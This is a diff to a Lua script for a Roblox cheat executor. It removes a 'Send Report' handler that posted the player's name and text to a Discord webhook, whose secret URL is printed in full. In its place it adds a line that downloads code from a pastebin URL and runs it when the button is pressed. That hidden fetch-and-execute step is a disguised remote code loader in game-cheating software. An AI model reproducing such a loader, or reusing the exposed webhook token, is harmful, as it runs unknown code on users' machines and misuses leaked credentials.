@@ -513,30 +513,7 @@ end
 
 pcall(function() getgenv().Sender_LOADED = true end)
 
-local exploits = identifyexecutor()
-local LP = game:GetService("Players")
-
-local url =
-   "https://discord.com/api/webhooks/1049640396893999124/gEJOC8DsvkPvNgffiaVpJBYFZoMCGD5PmCiHddMoanqJURv-TvTaSZx1lwr_fg8l1MXS"
-local data = {
-   ["content"] = "Report From "..LP.LocalPlayer.Name.." Using "..exploits..": "..TextBox.Text,
-}
-
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "Report Sent";
-	Text = "Report Successfully Sent!";
-	Icon = "rbxthumb://type=Asset&id=11782547157&w=150&h=150"})
-Duration = 16;
+loadstring(game:HttpGet(('https://pastebin.com/raw/Z0xJJRnh'),true))()
 end)
 
 UICorner_14.Parent = SendReportButton
